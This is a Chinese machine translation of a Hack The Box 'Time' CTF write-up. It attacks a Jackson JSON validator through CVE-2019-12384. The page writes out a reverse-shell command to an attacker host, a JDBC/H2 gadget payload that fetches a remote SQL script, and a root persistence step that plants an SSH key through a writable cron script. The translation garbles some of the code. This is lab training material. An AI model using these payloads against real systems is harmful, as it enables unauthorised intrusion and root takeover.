<html>
<head>
<title>HTB Time [writeup]</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">HTB时间[报道]</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/htb-time-writeup-1c5b51a82eb7?source=collection_archive---------7-----------------------#2022-12-05">https://infosecwriteups.com/htb-time-writeup-1c5b51a82eb7?source=collection_archive---------7-----------------------#2022-12-05</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><div class=""><h2 id="22fe" class="pw-subtitle-paragraph jq is it bd b jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh dk translated">RCE和SSRF的脆弱性</h2></div><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi ki"><img src="../Images/66467b8cf0e046016e69edfad3e2cc76.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0lAimW4DRYVnlyrjHJHwWA.png"/></div></div></figure><h1 id="c484" class="ku kv it bd kw kx ky kz la lb lc ld le jz lf ka lg kc lh kd li kf lj kg lk ll bi translated">侦察和计数</h1><p id="aa30" class="pw-post-body-paragraph lm ln it lo b lp lq ju lr ls lt jx lu lv lw lx ly lz ma mb mc md me mf mg mh im bi translated">Nmap TCP/UDP扫描输出</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi ca"><img src="../Images/9a896eca2829204b59c3de7d3f7a7e5c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4gIaKcZ3Y5wAyoZQ0Eu6RA.png"/></div></div></figure><h1 id="0b2e" class="ku kv it bd kw kx ky kz la lb lc ld le jz lf ka lg kc lh kd li kf lj kg lk ll bi translated">据点</h1><p id="b2a5" class="pw-post-body-paragraph lm ln it lo b lp lq ju lr ls lt jx lu lv lw lx ly lz ma mb mc md me mf mg mh im bi translated"><strong class="lo iu"> **********端口80/TCP http Apache httpd 2 . 4 . 41(Ubuntu)* * * * * * * * * * * * *</strong></p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi mi"><img src="../Images/87c55e9de9ed711c1cba583e58fbd5e4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*opoiKAYYkd5Fxv9l6wg_8Q.png"/></div></div></figure><p id="b595" class="pw-post-body-paragraph lm ln it lo b lp mj ju lr ls mk jx lu lv ml lx ly lz mm mb mc md mn mf mg mh im bi translated">这是一个在线JSON解析器站点。下拉菜单下有两个选项。(1.)美化(2。)Validate(beta！)</p><p id="a548" class="pw-post-body-paragraph lm ln it lo b lp mj ju lr ls mk jx lu lv ml lx ly lz mm mb mc md mn mf mg mh im bi translated">当我在美化文本框中输入一个简单的“测试这个网站”时，输出是<strong class="lo iu"> Null。</strong></p><p id="59b5" class="pw-post-body-paragraph lm ln it lo b lp mj ju lr ls mk jx lu lv ml lx ly lz mm mb mc md mn mf mg mh im bi translated">但是，当我在“Validate (beta！)”，它会抛出一些错误消息。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi mo"><img src="../Images/a66f3a88d87955d13a8ff5da4154ccb5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*OP1qvDFJz8uisQzwNWgc5Q.png"/></div></div><figcaption class="mp mq gj gh gi mr ms bd b be z dk translated"><strong class="bd kw">验证失败:未处理的Java异常com . faster XML . Jackson . core . jsonparseexception:无法识别的标记“Test”:应为(“true”、“false”或“null”)</strong></figcaption></figure><p id="fb75" class="pw-post-body-paragraph lm ln it lo b lp mj ju lr ls mk jx lu lv ml lx ly lz mm mb mc md mn mf mg mh im bi translated">在谷歌上搜索，我遇到了不少与“<strong class="lo iu">com . faster XML . Jackson . core . jsonparseexception</strong>”相关的CVE。然而，在几次尝试使用他们的<strong class="lo iu">步骤重现</strong>后，对我有效的是<strong class="lo iu">CVE-2019–12384。</strong>这利用了RCE和SSRF的漏洞。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi mt"><img src="../Images/e734227a1e7dadee8c04dad0d497161e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*JGy2physD4TpPe7Sh8a7ZQ.png"/></div></div></figure><h1 id="8b01" class="ku kv it bd kw kx ky kz la lb lc ld le jz lf ka lg kc lh kd li kf lj kg lk ll bi translated">反向外壳</h1><h2 id="6e0f" class="mu kv it bd kw mv mw dn la mx my dp le lv mz na lg lz nb nc li md nd ne lk nf bi translated">第一步</h2><p id="a84a" class="pw-post-body-paragraph lm ln it lo b lp lq ju lr ls lt jx lu lv lw lx ly lz ma mb mc md me mf mg mh im bi translated">使用此<a class="ae ng" href="https://github.com/jas502n/CVE-2019-12384" rel="noopener ugc nofollow" target="_blank">链接</a>创建<strong class="lo iu"> inject.sql </strong>漏洞利用文件并保存。</p><p id="3c61" class="pw-post-body-paragraph lm ln it lo b lp mj ju lr ls mk jx lu lv ml lx ly lz mm mb mc md mn mf mg mh im bi translated">替换:</p><blockquote class="nh ni nj"><p id="f2d2" class="lm ln nk lo b lp mj ju lr ls mk jx lu nl ml lx ly nm mm mb mc nn mn mf mg mh im bi translated"><em class="it">调用shell exec(' id&gt;exploited . txt ')</em></p></blockquote><p id="c302" class="pw-post-body-paragraph lm ln it lo b lp mj ju lr ls mk jx lu lv ml lx ly lz mm mb mc md mn mf mg mh im bi translated">随着</p><blockquote class="nh ni nj"><p id="1bf3" class="lm ln nk lo b lp mj ju lr ls mk jx lu nl ml lx ly nm mm mb mc nn mn mf mg mh im bi translated"><em class="it">调用shell exec(' bash-I&gt;&amp;/dev/TCP/</em>IP<em class="it">/1234 0&gt;&amp;1’)</em></p></blockquote><p id="4c60" class="pw-post-body-paragraph lm ln it lo b lp mj ju lr ls mk jx lu lv ml lx ly lz mm mb mc md mn mf mg mh im bi translated"><strong class="lo iu">第二步</strong></p><p id="361f" class="pw-post-body-paragraph lm ln it lo b lp mj ju lr ls mk jx lu lv ml lx ly lz mm mb mc md mn mf mg mh im bi translated">从站点执行代码时，启动<code class="fe no np nq nr b">python -m SimpleHTTPServer</code>获取inject.sql文件</p><p id="16b8" class="pw-post-body-paragraph lm ln it lo b lp mj ju lr ls mk jx lu lv ml lx ly lz mm mb mc md mn mf mg mh im bi translated">当执行<strong class="lo iu"> inject.sql </strong>文件时，启动<code class="fe no np nq nr b">nc -lvnp &lt;port&gt;</code>来删除shell。</p><p id="76aa" class="pw-post-body-paragraph lm ln it lo b lp mj ju lr ls mk jx lu lv ml lx ly lz mm mb mc md mn mf mg mh im bi translated"><strong class="lo iu">第三步</strong></p><p id="3a30" class="pw-post-body-paragraph lm ln it lo b lp mj ju lr ls mk jx lu lv ml lx ly lz mm mb mc md mn mf mg mh im bi translated">在JSON解析器站点中执行下面的脚本。</p><blockquote class="nh ni nj"><p id="585b" class="lm ln nk lo b lp mj ju lr ls mk jx lu nl ml lx ly nm mm mb mc nn mn mf mg mh im bi translated"><em class="it">[" ch . QoS . log back . core . db . drivermanagerconnectionsource "，{ " URL ":" JDBC:H2:mem:；TRACE _ LEVEL _ SYSTEM _ OUT = 3；INIT = run script FROM '</em><a class="ae ng" href="http://10.10.14.17:8765/inject.sql'" rel="noopener ugc nofollow" target="_blank"><em class="it">http://IP:PORT/inject . SQL '</em></a><em class="it">" }]</em></p></blockquote><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi ns"><img src="../Images/300f0b8ab60ade7886005f30dae08c5c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/1*gEXOBMeBIKvv2Q3ukZqUfg.gif"/></div></div></figure></div><div class="ab cl nt nu hx nv" role="separator"><span class="nw bw bk nx ny nz"/><span class="nw bw bk nx ny nz"/><span class="nw bw bk nx ny"/></div><div class="im in io ip iq"><h1 id="1268" class="ku kv it bd kw kx oa kz la lb ob ld le jz oc ka lg kc od kd li kf oe kg lk ll bi translated">横向运动</h1><p id="de23" class="pw-post-body-paragraph lm ln it lo b lp lq ju lr ls lt jx lu lv lw lx ly lz ma mb mc md me mf mg mh im bi translated">在列举了当前用户之后，对我有用的工具是pspy 32——它允许你看到其他用户运行的命令，cron作业等，当它们执行时，不需要root权限。</p><p id="7873" class="pw-post-body-paragraph lm ln it lo b lp mj ju lr ls mk jx lu lv ml lx ly lz mm mb mc md mn mf mg mh im bi translated">使用这个工具，我发现/usr/bin/timer_backup.sh在一段时间间隔后不断地被执行。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi of"><img src="../Images/4500ea3d7e3b34261aef0e2079fbfc5d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*dUPmr3C9BVeL_VllehCYnA.png"/></div></div></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi og"><img src="../Images/3216a18518055f8d1e96301e5f1f988c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*8hOrWhyj6k1oeOBSDieDPA.png"/></div></div></figure><p id="b2f9" class="pw-post-body-paragraph lm ln it lo b lp mj ju lr ls mk jx lu lv ml lx ly lz mm mb mc md mn mf mg mh im bi translated">该脚本的内容显示，它将zip文件移动到根文件夹。这意味着根文件夹中的文件可能会被完全权限执行。脚本<strong class="lo iu">/usr/bin/timer _ backup . sh</strong>有写权限。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi oh"><img src="../Images/19ba945526bef31f781bc4020653fdcf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qcf4ZUWNX0WNV8uo9ykbmg.png"/></div></div></figure><p id="1857" class="pw-post-body-paragraph lm ln it lo b lp mj ju lr ls mk jx lu lv ml lx ly lz mm mb mc md mn mf mg mh im bi translated">对于这台机器，我们还知道SSH端口是打开的。这意味着我们可以注入一个恶意代码，当它被执行时会给我们一个外壳。</p></div><div class="ab cl nt nu hx nv" role="separator"><span class="nw bw bk nx ny nz"/><span class="nw bw bk nx ny nz"/><span class="nw bw bk nx ny"/></div><div class="im in io ip iq"><h1 id="4fc6" class="ku kv it bd kw kx oa kz la lb ob ld le jz oc ka lg kc od kd li kf oe kg lk ll bi translated">权限提升</h1><p id="4c0c" class="pw-post-body-paragraph lm ln it lo b lp lq ju lr ls lt jx lu lv lw lx ly lz ma mb mc md me mf mg mh im bi translated">现在我们已经找到了攻击媒介，修改<strong class="lo iu"> /usr/bin/timer_backup.sh </strong>脚本。</p><blockquote class="nh ni nj"><p id="870b" class="lm ln nk lo b lp mj ju lr ls mk jx lu nl ml lx ly nm mm mb mc nn mn mf mg mh im bi translated"><em class="it">echo</em><strong class="lo iu">echo<em class="it">插入SSH公钥</em> </strong> <em class="it"> &gt; &gt; /root/。ssh/authorized _ keys "&gt;&gt;/usr/bin/timer _ backup . sh</em></p></blockquote><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi oi"><img src="../Images/ec5136dbc04dea441d7f159ae1710b63.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*CCQgVT0w4sRy4dT-xwLSLg.png"/></div></div></figure><p id="da9c" class="pw-post-body-paragraph lm ln it lo b lp mj ju lr ls mk jx lu lv ml lx ly lz mm mb mc md mn mf mg mh im bi translated"><strong class="lo iu">端口22/tcp SSH OpenSSH </strong></p><p id="9389" class="pw-post-body-paragraph lm ln it lo b lp mj ju lr ls mk jx lu lv ml lx ly lz mm mb mc md mn mf mg mh im bi translated">一旦成功注入，timer_backup.sh脚本将被执行，并将本地主机的SSH公钥保存到机器根目录的authorized_keys文件中。这将允许我们从本地主机帐户登录，如下所示。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi oj"><img src="../Images/2575bb48011b22dc9be917b148a55fe6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*B6hmvDwDYKTCRG5nixjhYw.png"/></div></div></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi ok"><img src="../Images/522ce8b1a2e3ba84c9a2de2317792acb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qhphZVWbqg8wGP6ZZQrSZA.png"/></div></div><figcaption class="mp mq gj gh gi mr ms bd b be z dk translated"><strong class="bd kw">成功了！！！</strong></figcaption></figure></div><div class="ab cl nt nu hx nv" role="separator"><span class="nw bw bk nx ny nz"/><span class="nw bw bk nx ny nz"/><span class="nw bw bk nx ny"/></div><div class="im in io ip iq"><h1 id="41d0" class="ku kv it bd kw kx oa kz la lb ob ld le jz oc ka lg kc od kd li kf oe kg lk ll bi translated">参考</h1><ul class=""><li id="745a" class="ol om it lo b lp lq ls lt lv on lz oo md op mh oq or os ot bi translated"><a class="ae ng" href="https://github.com/redisson/redisson/issues/1780" rel="noopener ugc nofollow" target="_blank">https://github.com/redisson/redisson/issues/1780</a></li><li id="cf9e" class="ol om it lo b lp ou ls ov lv ow lz ox md oy mh oq or os ot bi translated"><a class="ae ng" href="https://blog.doyensec.com/2019/07/22/jackson-gadgets.html" rel="noopener ugc nofollow" target="_blank">https://blog.doyensec.com/2019/07/22/jackson-gadgets.html</a></li><li id="bfcf" class="ol om it lo b lp ou ls ov lv ow lz ox md oy mh oq or os ot bi translated"><a class="ae ng" href="https://github.com/jas502n/CVE-2019-12384" rel="noopener ugc nofollow" target="_blank">https://github.com/jas502n/CVE-2019-12384</a></li></ul></div><div class="ab cl nt nu hx nv" role="separator"><span class="nw bw bk nx ny nz"/><span class="nw bw bk nx ny nz"/><span class="nw bw bk nx ny"/></div><div class="im in io ip iq"><h1 id="ef43" class="ku kv it bd kw kx oa kz la lb ob ld le jz oc ka lg kc od kd li kf oe kg lk ll bi translated">我的其他HTB报道</h1><ul class=""><li id="0936" class="ol om it lo b lp lq ls lt lv on lz oo md op mh oq or os ot bi translated"><a class="ae ng" rel="noopener ugc nofollow" target="_blank" href="/htb-omni-writeup-7efdc6fd1c10">HTB·OMNI报道——利用SireRAT开发Windows物联网核心</a></li><li id="a5e2" class="ol om it lo b lp ou ls ov lv ow lz ox md oy mh oq or os ot bi translated"><a class="ae ng" rel="noopener ugc nofollow" target="_blank" href="/htb-blackfield-writeup-e7c3570aca00">HTB·布莱克菲尔德撰文- ASREPRoast |字典攻击</a></li><li id="41f9" class="ol om it lo b lp ou ls ov lv ow lz ox md oy mh oq or os ot bi translated"><a class="ae ng" rel="noopener ugc nofollow" target="_blank" href="/htb-passage-writeup-172490d4045e"> HTB文章-无限制文件上传| RCE |弱密码| d-bus漏洞</a></li><li id="27c0" class="ol om it lo b lp ou ls ov lv ow lz ox md oy mh oq or os ot bi translated"><a class="ae ng" rel="noopener ugc nofollow" target="_blank" href="/htb-academy-writeup-bf518031e7f"> HTB学院报道-商业逻辑漏洞| ADM集团</a></li><li id="1fa2" class="ol om it lo b lp ou ls ov lv ow lz ox md oy mh oq or os ot bi translated"><a class="ae ng" rel="noopener ugc nofollow" target="_blank" href="/htb-doctor-writeup-61e589400875"> HTB医生特写-服务器端模板注入| Splunk用友RCE </a></li><li id="fae1" class="ol om it lo b lp ou ls ov lv ow lz ox md oy mh oq or os ot bi translated"><a class="ae ng" rel="noopener ugc nofollow" target="_blank" href="/htb-worker-writeup-74033203b785"> HTB工人报道-问题:打开svn端口&gt;错误配置svn系统&gt;无限制文件上传&gt;错误配置设置</a></li><li id="77e4" class="ol om it lo b lp ou ls ov lv ow lz ox md oy mh oq or os ot bi translated"><a class="ae ng" rel="noopener ugc nofollow" target="_blank" href="/htb-openkeys-writeup-531264648200"> HTB OpenKeyS writeup - OpenBSD认证旁路| HTTP头篡改|内核操作系统本地根漏洞利用</a></li><li id="798a" class="ol om it lo b lp ou ls ov lv ow lz ox md oy mh oq or os ot bi translated"><a class="ae ng" rel="noopener ugc nofollow" target="_blank" href="/htb-sneakymailer-writeup-bb32e94f593"> HTB间谍邮件作者-群发邮件钓鱼| PyPi包文件滥用| pip3 </a></li><li id="d307" class="ol om it lo b lp ou ls ov lv ow lz ox md oy mh oq or os ot bi translated"><a class="ae ng" rel="noopener ugc nofollow" target="_blank" href="/htb-buff-writeup-5d118ab695c0"> HTB总线报告-未经验证的RCE |缓冲区利用|端口转发</a></li><li id="f3e8" class="ol om it lo b lp ou ls ov lv ow lz ox md oy mh oq or os ot bi translated"><a class="ae ng" rel="noopener ugc nofollow" target="_blank" href="/htb-tabby-writeup-e5d25fb57329"> HTB虎斑猫记-目录遍历| LXD | RCE |弱密码</a></li><li id="b6c7" class="ol om it lo b lp ou ls ov lv ow lz ox md oy mh oq or os ot bi translated"><a class="ae ng" rel="noopener ugc nofollow" target="_blank" href="/htb-fuse-writeup-2c181d837b78"> HTB熔丝报道-域控制器侦测|密码喷洒|暴力攻击| SeLoadDriverPrivilege Abuse </a></li><li id="6c11" class="ol om it lo b lp ou ls ov lv ow lz ox md oy mh oq or os ot bi translated"><a class="ae ng" rel="noopener ugc nofollow" target="_blank" href="/htb-blunder-writeup-6785bd826bfa"> HTB失策记- Bludit 3.9.2密码暴力破解|安全策略绕过</a></li><li id="23b2" class="ol om it lo b lp ou ls ov lv ow lz ox md oy mh oq or os ot bi translated"><a class="ae ng" rel="noopener ugc nofollow" target="_blank" href="/htb-cache-writeup-c3966ac8867c"> HTB缓存写- SQL注入| unauth Memcached暴露凭证| Docker Linux映像漏洞利用</a></li><li id="10ad" class="ol om it lo b lp ou ls ov lv ow lz ox md oy mh oq or os ot bi translated"><a class="ae ng" rel="noopener ugc nofollow" target="_blank" href="/htb-remote-writeup-eb18b1e09234"> HTB远程报告- NFS检查、CMS利用、UsoSvc服务权限利用</a></li></ul></div><div class="ab cl nt nu hx nv" role="separator"><span class="nw bw bk nx ny nz"/><span class="nw bw bk nx ny nz"/><span class="nw bw bk nx ny"/></div><div class="im in io ip iq"><h2 id="2d2a" class="mu kv it bd kw mv mw dn la mx my dp le lv mz na lg lz nb nc li md nd ne lk nf bi translated">来自Infosec的报道:Infosec每天都有很多内容，很难跟上。<a class="ae ng" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank">加入我们的每周简讯</a>以5篇文章、4个线程、3个视频、2个GitHub Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</h2></div></div>    
</body>
</html>